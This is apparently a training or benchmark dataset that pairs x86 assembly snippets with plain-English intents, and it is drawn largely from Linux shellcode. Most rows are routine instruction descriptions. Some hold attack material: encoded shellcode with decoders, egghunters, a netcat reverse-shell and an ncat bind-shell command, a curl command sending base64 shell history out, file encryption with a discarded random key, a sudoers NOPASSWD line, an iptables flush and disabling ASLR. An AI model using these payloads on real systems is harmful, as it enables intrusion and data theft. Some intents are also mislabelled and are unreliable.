SNIPPETS	INTENTS
_appendfile:	declare appendfile_label
_appendfile:	define the _appendfile label
_build:	declare _build label
_build:	define the _build label
_child:	define the _child label
_close:	declare _close label
_close:	define the _close label
_cmd:	define _cmd label
_cmd:	declare _cmd register
_cmd:	define the _cmd label
_continue:	define the _continue label
_decoder:	define _decoder_label
_dup2_loop:	define _dup2_loop label
_dup2_loop:	define the _dup2_loop label
_egg:	define the _egg label
_exec:	declare _exec _label
_exec:	define _exec label
_exec:	declare _exec label
_exec:	define the _exec label
_execline:	define _execline label
_execline:	define the _execline label
_exit:	define _exit label
_exit:	define the _exit label
_file:	_declare _file label
_file:	define _file_label
_file:	define the _file label
_ip equ 0x0100007f	define ip address as _ip = 0x0100007f
_ip equ 0x0100007f	define ip equal to 0x0100007f
_isegg:	define the _isegg label
_load_data:	define _load_data label
_load_data:	define the _load_data label
_next:	define the _next label
_param:	declare _param label
_param:	define the _param label
_params:	define _params label
_params:	define the _params label
_parent_read:	define the _parent_read label
_parent:	define the _parent label
_random:	define _random label
_random:	define the _random label
_read:	define _read label
_return:	define the _return label
_setsockopt:	define the _setsockopt label
_shell:	define the _shell label
_socket:	define the _socket label
_start:	declare _start label
_start:	_start function
_start:	_start label
_start:	_start
_start:	define the _start label
_start: \n jmp call_decoder	define the _start label and jump short to the call_decoder
_start: \n jmp call_decoder	define the _start label and jump to the call_decoder
_start: \n jmp call_decoder	define the _start label and jump to call_decoder
_start: \n jmp short call_decoder	define the _start label and jump short to the call_decoder
_start: \n jmp short call_decoder	define the _start label and jump short to call_decoder
_start: \n jmp short call_shellcode	define the _start label and jump short to the call_shellcode
_start: \n jmp short call_shellcode	define the _start label and jump short to call_shellcode
_start: \n jmp short call_shellcode	define the _start label and jump short to call_shellcode label
_start: \n jmp short enc	define the _start label and jump short to enc
_start: \n jmp short stage	define the _start label and jump short to stage
_user:	declare _user label
_user:	define the _user label
_while_loop:	define the _while_loop label
_write:	declare _write label
_write:	define _write label
_write:	define the _write label
1:	define the numeric label 1
1:	define the label 1
2:	define the label 2
2:	define the numeric label 2
3:	define the label 3
3:	define the numeric label 3
a_letter db 'd'	allocate one byte of memory for a_letter variable and initialize it to 'd'
aas	correct the result od the previous unpacked decimal substraction in al register
adc eax, 0x9c09ebea	sum hexadecimal value 0x9c09ebea with eax register. if cf is set, add 1 to eax.
add [ebp-4], esi	add esi into memory address ebp-4
add ah, bh	add the contents of the bh register into the ah register
add al, 0x2	add 0x2 to al
add al, 0x25	add 0x25 to the al register
add al, 0x3	add 0x3 to the contents in al and save the result in al
add al, 0x33	add 0x33 to the contents in al and save the result in al
add al, 0x40	add 0x40 to the al register
add al, 0x66	add 0x66 to the contents in al and save the result in al
add al, 0xa	add 0xa to the al register
add al, 0xb	add 0xb to the al register
add al, 2	add 2 to al register
add al, 2	add the value 2 to the contents of the al register
add al, 3	add 3 to al register
add al, 3	add 3 to al
add al, byte '0'	add byte '0' to al
add al, byte [edi]	add the byte in edi to the al register
add al,0x2	add hexadecimal value 0x2 to al register
add al,0x3	add the value 0x3 into al register
add al,0x33	add the hexadecimal value 0x33 to al register
add al,0x3b	add hexadecimal value 0x3b to al register
add al,0x66	add the hexadecimal value 0x66 to al register
add ax, [di + 20]	add memory[di + 20] to ax
add ax, 01	add 01 to ax
add ax, bx	add the contents of bx into ax
add bl, 0x2	load jexadecimal value 0x2 into bl register
add bl, 0x2	add 2 to bl content
add bl, 0x2	add 0x2 to the contents in bl and save the result in bl
add bx, ax	add ax to bx
add byte [edi], 0x4 \n not byte [edi]	add 0x4 from the byte at the address edi and negate the result
add byte [edi], 7 \n not byte [edi]	add the byte at the address edi after subtracting the value 7
add byte [edi], 8 \n not byte [edi]	add the value 8 from the byte in edi and negate it
add byte [esi], 0x02	add 0x02 to the current byte in esi
add byte [esi], 0x1 \n not byte [esi]	add 0x1 from the current byte of the shellcode and negate the result
add byte [esi], 0x1 \n not byte [esi]	add 0x1 from the byte at the address esi and negate the result
add byte [esi], 0x10	add 0x10 to the current byte in esi
add byte [esi], 0x9 \n not byte [esi]	add the value 0x9 from the current byte of the shellcode and then negate the result
add byte [esi], 2	adds 2 to the first character pointed from esi
add byte [esi], 2	add the byte value 2 to the esi register
add byte [esi], 2 \n not byte [esi]	negate the byte at the address esi after adding the value 2
add byte [esi], 3 \n not byte [esi]	add the value 3 from the byte in esi and negate it
add byte [var], 10	add 10 to the single byte stored at memory address var
add byte [var], 20	add 20 to the single byte stored at memory address var
add byte [var], 30	add 30 to the single byte stored at memory address var
add byte_value, 65	add an immediate operand 65 to byte_value
add byte_value, dl	add the register dl in the memory location byte_value
add cl, 0x2	add 2 to counter
add cl, 0x2	add 2 to counter cl
add cl, 0x2	add 0x2 to the contents in cl and save the result in cl
add cl, 0xb8	add 0xb8 to the cl register
add dx, 0x1b	add the value 0x1b into the dx register
add dx, 0x2f2f	add 0x2f2f to the contents in dx and save the result in dx
add dx,0x1b	add 27 to dx contents
add dx,0x2f2f	then add to it the hexadecimal value 0x2f2f.
add eax, [ebp-4]	add the contents of the local variable stored at ebp-4 into eax
add eax, 0x10	add 0x10 to eax
add eax, 0x12345678	add 0x12345678 to the contents in eax and save the result in eax
add eax, 0x2d383638	add 0x2d383638 to the contents in eax and save the result in eax
add eax, 0x2d383638 \n push eax	push ‘hmod’ on stack
add eax, 0x31179798	add 0x31179798 to the contents in eax and save the result in eax
add eax, 0x5 \n jnz L2	add 0x5 to edx and jump to L2 if the result is not 0
add eax, 0x7 \n jnz L4	add the value 0x7 to eax and jump to the label L4 if the sum is not zero
add eax, 1 \n jnz L1	add 1 to ebx and jump to L1 if the result is not zero
add eax, 10	add 10 to eax
add eax, 10	add 10 to the contents of eax
add eax, 16	add 16 to eax
add eax, 2	add 2 to the contents of the eax register
add eax, 2	add 2 to the eax register
add eax, 2	add decimal 2 to eax register
add eax, 24	add 24 to eax
add eax, 3 \n jnz L3	add 3 to ecx and jump to L3 if the sum is not zero
add eax, 4	add 4 to eax
add eax, 4 \n jnz decode	add 4 to eax and jump to decode if the result is not zero
add eax, 40000h	add 40000h to eax register
add eax, 48	add decimal 48 to eax
add eax, 48	add 48 to eax
add eax, 9 \n jnz decode	add the value 9 to eax and jump to decode if the result is not zero
add eax, c	add c to eax
add eax, ebx	add the contents of ebx to the contents of eax
add eax, ebx	add the value on ebx to eax
add eax, ebx	add ebx to eax
add eax, ebx	add ebx to eax and store the result in eax
add eax, edx	add edx to eax
add eax, edx	add the contents of edx to the contents of eax
add eax, edx	add the contents of the edx register to the contents of eax register
add eax, esi	add the contents of esi to the contents of eax
add eax, esi	add the contents of the esi register to the contents of eax register
add eax,0xe458376a	add hexadecimal value 0xe458376a to eax register
add ebp, 0x2	add 0x2 to the contents of ebp
add ebp, 0x2	add 0x2 to ebp
add ebx, 0x2	save sys_connect = 3 into ebx register
add ebx, 0x2	add 0x2 to the contents in ebx and save the result in ebx
add ebx, 16	add 16 to ebx
add ebx, 2	add decimal integer 2 to ebx
add ebx, 2	add 2 to the contents of the ebx register
add ebx, 24	add 48 to ebx
add ebx, 3	add the value 3 to the content of ebx register
add ebx, 3	add 3 to the contents of the ebx register
add ebx, 5	add decimal integer 5 to ebx
add ebx, ecx	add ecx to ebx
add ebx,2	add 2 to ebx content
add ecx, 1	add the value 1 into the ecx register
add ecx, 16	add 16 to ecx
add ecx, ebx	add ebx to ecx
add edi, 2	add 2 to edi
add edi, 37	add 37 to edi contents
add edi, edi	add the contents of edi to the contents of edi
add edi, edi	add the contents of the edi register to the contents of edi register
add edi,0x11111111	add hexadecimal value 0x11111111 to edi content
add edx, 16	set edx to next 16 byte block
add edx, 32	add 32 to edx
add edx, 48	add 48 to edx
add edx, 64	add the value 64 to the content of edx register
add edx, 64	add 64 to the contents of the edx register
add edx, eax	add the contents of eax to the contents of edx
add edx, eax	add the contents of the eax register to the contents of edx register
add edx, eax	add the contents of the eax register to the edx register
add edx, ecx	add ecx to edx
add edx,ebx	add ebx content to edx
add esi, 0x21354523	add 0x21354523 to the contents in esi and save the result in esi
add esi, 0x21354523	add 0x21354523 to the contents of esi
add esi, 0x30	add hexadecimal value 0x30 to esi content
add esi, 0x30	add 0x30 to esi
add esi, 0x33333333	add the hexadecimal value 0x33333333 at esi content
add esi, 0x33333333	add 0x33333333 value to esi
add esi, 0x3f3f3f3f	add 0x3f3f3f3f to the contents in esi and save the result in esi
add esi, 0x8	add 0x8 to esi
add esi, 0x8	"make esi point to next 8bytes of ""shellcode"""
add esi, 2	add 2 to the contents of esi
add esi, 4	add 4 to the contents of the esi register
add esi, 4	add 4 to esi
add esi, eax	set the mem addr dinamically
add esi, eax	add the contents of the eax register to the contents of esi register
add esi, eax	add eax to esi
add esi,4	scan the next section of mem
add esp, 0x20	add 0x20 to the contents in esp and save the result in esp
add esp, 3	add 3 to the contents of esp
add esp, 3	add 3 to the contents of the esp register
add esp, 4	add 4 to the esp register
add marks, 10	add 10 to the variable marks
addr: db 0x1	define addr = db 0x1
addr: db 0x1	define the byte addr and initialize it to 0x1
all:	define _all label
all:	define the all label
an_integer dd 12425	define the doubleword an_integer and initialize it to 12425
and al, 0fh	perform a logical and operation between the al register and the 0fh value and store the result in the al register
and ax, 1	perform logical and between ax and 1
and eax, 0000000fh	mask out lowest 4 bits of the eax register
and eax, 0fh	clear all but the last 4 bits of eax
and eax, 3f465456	perform and operation between eax and 3f465456 and save the result in eax
and eax, 40392b29	perform and operation between eax and 40392b29 and save the result in eax
and ebx, 0000000fh	mask out lowest 4 bits of the ebx register
and ecx, 0000000fh	mask out lowest 4 bits of the ecx register
and ecx,dword ptr [eax-0x7]	anding the double word at the adress eax-0x7 and ecx register
and ecx,dword ptr [ebx+0x1a]	anding the double word at the adress ebx+0x1a and ecx register
and edx, 0000000fh	mask out lowest 4 bits of the edx register
and mask1, 128	perform and operation on the variable mask1 and 128
arr dd 100	define the doubleword arr and initialize it to 100
arr dd 50	define the doubleword arr and initialize it to 50
arr1 resb 400	reserve the array arr1 of 400 uninitialized bytes
array dd 20	define the doubleword arr and initialize it to 20
array word 20	define an array of 20 initialized word
array word 5	define an array of 5 initialized word
aslr_file:	define _aslr_file label
b: dd 0x0	create variable b in memory and initialize to zero
big_number dd 123456789	define the doubleword variable big_number and initialize it to 123456789
bignum: resw 1	reserve 1 word at location bignum
bound ebp,qword ptr [ecx+0x6e]	perform a bound check to array index
bound ebp,qword ptr [edx-0x55915597]	perform a bound check to array index
bound esp,qword ptr [ebx+0x41]	perform a bound check to array index
buffer: resb 64	reserve 64 bytes for buffer
buffersize: dw 1024	declare buffersize to be a word containing 1024
byte_table db 14, 15, 22, 45	define a tables of bytes byte_table and initialize to 14, 15 and 22
byte_value db 150	define the byte value byte_value and initialize it to 150
bytes db 10	define the byte value bytes and initialize it to 10
bytes db 20	define the byte value bytes and initialize it to 20
call _appendfile	call the _appendfile function
"call _appendfile \n msg2 db ""passwd"", 0x00"	jump to _appendfile label after putting the address of the next istruction on the top pf the stack
call _build	call the _build function
"call _build \n msg db ""curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post"", 0x0a"	push the address of msg on the top of the stack, and then change the eip to the address in _build label
call _continue	call _continue
call _continue	call the _continue function
call _exec	jump to _exec label
call _exec	call the _exec function
"call _exec \n msg db ""mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt"", 0x0a"	push the address of message on the top of the stack, and then change the eip to the address in _exec label
call _exit	call _exit
call _malloc	call _malloc
call _myfunc	call the _myfunc function
call _params	call the _params function
"call _params \n string db ""test.txt"""	push the address of test.txt on the top of the stack, and then change the eip to the address in _params label
call _printf	call the _printf function
call _write	call the _write function
"call _write \n google: db ""127.1.1.1 google.com"""	go to _write label after entering google address on the top of the sack
call [esp]	push the current code location on stack and the perform an unconditional jumo to the code location indicated by esp content
call [esp]	execute decoded_shellcode
call [esp]	call the function in esp
call atoi	call the atoi function
call code	call the code function
"call code \n file: db ""/sbin/iptables#-f"""	"push the address of file: db ""/sbin/iptables#-f"" on the top of the stack, and then change the eip to the address in code_label"
call cont	call the cont function
call cont \n db '0',10	go to _cont after entering db '0',10 adress on the top of the stack
call decoder	jump to _decoder label
call decoder	go to _decoder label
call decoder	go to deocder label
call decoder	jump to decoder_label
call decoder	call the function decoder
call decoder	call the decoder function
call decoder	call decoder
call decoder \n encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539	jump to _decoder label after saving encoded_shellcode ' dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539' pointer to esi
call decoder \n encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539	jump to decoder_label after entering the double word string encoded '0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539' on stack
call decoder \n encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	push the address of encodedshellcode on the top of the stack, and then change the eip to the address in _shellcode label
call decoder \n encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94, 0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87	jump to _decoder label after entering _encodedshellcode (db db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87) on the top of the stack
call decoder \n shellcode: db 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87	go to _decoder label after entering the address of the array shellcode (0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87) on the top of the stack
call decoder \n shellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d	go to _decoder label after entering shellcode (db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d) address on the top of the stack
call decoder \n shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23 \n shellcodelen equ $-shellcode	shellcode address will be pushed into the stack
call decoder \n shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01	go to _decoder label after entering shellcode ‘0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01’ on the top of the stack
call decoder \n xor dword ptr [edx-0x55af5540],ebp	xoring ebp content with the double word at the adress edx-0x55af5540 then go to decoder label
call decoder_setup	call decoder_setup
call decoder1 \n xor_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa \n rot_value: db 13, 13, 13, 13, 13, 13, 13, 13 \n shellcode: db 0x94,0x67,0xf7,0xdf,0x96,0x96,0x2a,0xdf,0xdf,0x96,0xc5,0xdc,0xd1,0x3c,0x5a,0xf7,0x3c,0x45,0xca,0x3c,0x44,0x17,0xb2,0x70,0x27	jump to decoder1_label afetr entering xor_value, rot_value and shellcode on the top pf the stack
call doit	call the doit function
call egghunter	go to egghunter
call egghunter	call the egghunter function
call esi	call esi
call esi	call the function in esi
call esp	call esp
call execute	call the execute function
"call execute \n db ""cp /bin/sh /tmp/sh”"	"put db ""cp /bin/sh /tmp/sh” address on stack then jump to _esecute label"
call internetreadfile	call function internetreadfile
call iprint	call the iprint function
call iprintlf	call the iprintlf function
call jmp_search	call jmp_search
call jmp_search	call the jmp_search function
call loader	call loader
call loader	call the loader function
call main	call the main function
call me	call the me function
call my_subroutine	call my_subroutine
call near stageaddress	call near stageaddress
call near stageaddress	call the near function
call one	call the one function
"call one \n string: db ""/etc/passwd"""	"push the address of string: db ""/etc/passwd"" on the top of the stack, and then change the eip to the address in one_label"
call open	jump to open_label
call prepare	call the prepare function
call prepare \n db ',ajm,pk#########'	go to prepere after storing string on the stack
call quit	call the quit function
call returnlabel	call returnlabel
call set_argv	call set_argv
call set_argv	call the set_argv function
"call set_argv \n cmd: db ""cat /etc/passwd;echo do__ne"""	"go to _set_argv label afeter entering the byte string cmd = cat /etc/passwd;echo do__ne on stack"
call shell_ret	call the shell_ret function
call shell_ret \n db “/bin/sh”	go to shell_ret label after ebtering byte string “/bin/sh” address on stack
call shellcode	jump to the address of shellcode_label
call shellcode	call the shellcode function
call shellcode \n db '/proc/sys/kernel/randomize_va_space'	go to _shellcode label after entering the address of the string = ‘/proc/sys/kernel/randomize_va_space' on the top of the stack
call shellcode \n db '/proc/sys/kernel/randomize_va_spacex'	go to _shellcode label after entering the byte string '/proc/sys/kernel/randomize_va_spacex' address on stack
call shellcode \n db 'my.txtx'	go to _shellcode label after entering the byte string ‘mt.txtx’ address on the top of the stack
"call shellcode \n message db ""/bin/sh"""	push the address of /bin/sh on the top of the stack, and then change the eip to the address in shellcode_label
call shellcode \n port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	go to shellcode label after entering port: db db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77 address on stack
call shellcode db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'	jump to shellcode_label after entering the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd' on the top of the stack
call sprint	call the sprint function
call sprintlf	call the sprintlf function
call start	call the start function
call strlen	call the strlen function
call two	call the two function
call write	go to _write label
call write	call the write function
"call write \n db ""all all=(all) nopasswd: all"" , 0xa"	"entring db ""all all=(all) nopasswd: all"" , 0xa address on stack, then jump to _write label"
call writestring	call writestring
call writestring	call the writestring function
"call writestring \n db ""rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc localhost 9999 > /tmp/fr"""	"go to _writestring label after entering the byte string ""rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc localhost 9999 > /tmp/fr"" address on the top of the stack"
call_decoded:	define call_decoded_label
call_decoded:	define the call_decoded label
call_decoded: \n call [esp]	define call_decoded and execute it
call_decoder:	declare _call_decoder label
call_decoder:	define _call_decoder label
call_decoder:	define call_decoder label
call_decoder:	define call_decoder_label
call_decoder:	define call_decoder function
call_decoder:	define call_decoder
call_decoder:	call_decoder label
call_decoder:	define the call_decoder label
call_decoder: \n call decoder	define call_decoder and call decoder function
call_decoder: \n call decoder	define the call_decoder label and call the decoder function
call_decoder: \n call decoder	define call_decoder and call decoder
call_decoder: \n call decoder \n shellcode: db 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87	in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87
call_egghunter:	define call_egghunter label
call_egghunter:	define the call_egghunter label
call_shellcode:	declare _call_shellcode label
call_shellcode:	declare call_shellcode_label
call_shellcode:	define call_shellcode_label
call_shellcode:	delcare call_shellcode_label
call_shellcode:	define call_shellcode label
call_shellcode:	define call_shellcode function
call_shellcode:	call_shellcode function
call_shellcode:	call_shellcode routine
call_shellcode:	declare the call_shellcode label
call_shellcode:	define the call_shellcode label
call_shellcode: \n call decoder	define the call_shellcode label and call the decoder function
call_shellcode: \n call decoder	define the call_shellcode function and call decoder
call_shellcode: \n call decoder	define call_shellcode and call decoder function
call_shellcode: \n call decoder	in call_shellcode call the decoder function
call_shellcode: \n call decoder	in call_shellcode execute the decoder routine
call_write:	define _call_write label
call_write:	define the call_write label
callit:	define the callit label
callme:	define the callme label
callpop:	define _ callpop label
callpop:	define the callpop function
callpop:	define the callpop label
cdq	convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax
cdq	convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax (clear eax and edx registers)
cdq	zero out edx using the sign bit from eax
cdq	save edx as a null byte
cdq	convert signed dword in eax to a signed quad word in edx:eax
cdq	set edx to 0
cdq	edx to 0
cdq	set edx = 0
cdq	overwriting edx with either 0
cdq	zero out edx
cdq	clear the edx register
cdq	extend the sign bit of the eax register into the edx register
cdq	extend the sign bit of eax register into the edx register
cdq	extend the sign bit of eax into the edx register
cdq \n mov ecx, edx	zero out edx and ecx regsiter
cdq \n push edx	zero out edx and push ortocol id = 0 on stack
check_even_odd:	define check_even_odd label
check_even_odd:	define check_even_odd
check_even_odd:	define check_even_odd function
child:	define the child function
child:	define the child label
chmod_call equ 15	define chmod_call =15
chmod_call equ 15	define chmod_call equal to 15
choice db 'y'	define variable choice of 1 byte and initialize to y
cld	clear the direction flag
cld	clear direction flag increasing si and di index registers.
cld	set the direction flag to zero
cld	direction flag equal to zero
cli	clear interrupt flag
close_syscall equ 6	define close_syscall=6
close_syscall equ 6	define close_syscall equal to 6
close:	define close_label
closefile:	define _closefile label
closefile:	define the closefile function
closefile:	define the closefile label
cmd:	define _cmd label
cmd:	define the cmd label
cmd: db 'cat /etc/passwd'	declare cmd string and initialize it to 'cat /etc/passwd'
cmd: db 'cat /etc/passwd'	define cmd as the byte string 'cat /etc/passwd'
cmp [ebp+arg_0], 1	compare the contents stored at ebp+arg_0 with 1
cmp [ebp+var_a], 0	compare if the contents at memory location ebp+var_a is 0
cmp [ebp+var_a], 0	compare the contents at memory location ebp+var_a with 0
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
cmp [ebp+var_a], 0 \n jnz short loc_4010E5	if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
cmp [esi], edx	compare the contents at memory location esi and the contents of the edx register
cmp [esi], edx	compare the contents at memory location esi with edx
cmp al, 0x38 \n je 0x40 \n push byte 0x1	jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
cmp al, 0x38 \n je 0x40 \n push byte 0x1	if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
cmp al, 0xaa \n je decode_insertion \n xor al, bl	jump to the decode_insertion label if the contents of the al register is equal to the vale 0xaa else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xaa \n je decode_insertion \n xor al, bl	if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
cmp al, 0xf2	if it return efault, bad address
cmp al, 0xf2	compare if the contents of al with 0xf2
cmp al, 0xf2	compare the contents of the al register and 0xf2
cmp al, 0xf2	compare the contents of the al register with the value 0xf2
cmp al, 0xf2 \n je _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je _start \n mov eax, 0x50905090	if the contents of the al register is equal to the value 0xf2 then jump to the _start label else move the value 0x50905090 into the eax register
cmp al, 0xf2 \n je fillOnes	jump to the fillOnes label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je fillOnes	if the contents of the al register is equal to the value 0xf2 then jump to the fillOnes label
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193	if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
cmp al, 0xf2 \n je next_page	jump to the label next_page if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n je next_page	if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
cmp al, 0xf2 \n jz _start	jump to the _start label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz _start	if the contents of the al register is equal to the value 0xf2 then jump to the _start label
cmp al, 0xf2 \n jz incpage	if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
cmp al, 0xf2 \n jz incpage	jump to the incpage label if the contents of the al register is equal to the value 0xf2
cmp al, 0xf2 \n jz next_page	verify if sys_access returned an efault, and if it matchs jump to next_page label
cmp al, 9 \n jg l1	jump to the label l1 if the contents of the al register is greater than the decimal value 9
cmp al, 9 \n jg l1	if the contents of the al register is greater than the decimal value 9 then jump to the label l1
cmp al, 9 \n jge l1	jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
cmp al, 9 \n jge l1	if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
cmp al, bl \n ja l2 \n add eax, 3	jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
cmp al, bl \n ja l2 \n add eax, 3	if the unsigned contents of the al register is greater than the unsigned contents of the bl register then jump to the l2 label else add the value 3 to the eax register
cmp al, bl \n jb l2	jump to the label l2 if the unsigned contents of the al register is lower than the unsigned contents of the bl register
cmp al, bl \n jb l2	if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2
cmp al, cl	compare the contents of al with the cl register
cmp al, cl	compare the contents of the al register and the contents of the cl register
cmp al, cl \n jne short decode \n jmp shellcode	if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label
cmp al, cl \n jne short decode \n jmp shellcode	jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
cmp al, cl \n jnz short decode \n jmp shellcode	check if reached the end of shellcode comparing cl with al register. if not return to _decode label else go to _shellcode label
cmp al, cl \n jnz short decode \n jmp shellcode	jump short to decode if al is not equal to cl else jump to shellcode
cmp al,0xaa \n je decode_insertion	if al regsiter content is equal to the hexadecimal value 0xaa jump to decode_insertion label
cmp al,0xf2 \n jz _start	if efault page alignment
cmp ax, bx \n jne l3	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register
cmp ax, bx \n jne l3	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
cmp ax, bx \n jne l3 \n jmp while	if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
cmp ax, bx \n jne l3 \n jmp while	jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register else jump to the while label
cmp bh, al	compare the contents of bh and the contents of al
cmp bl, 0x1f	compare the contents of bl and 0x1f
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	jump to the memory address 0xf3 if the unsigned contents of the bl register is lower than the unsigned value 0x1f else add the 0x40 value to the al register
cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40	if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register
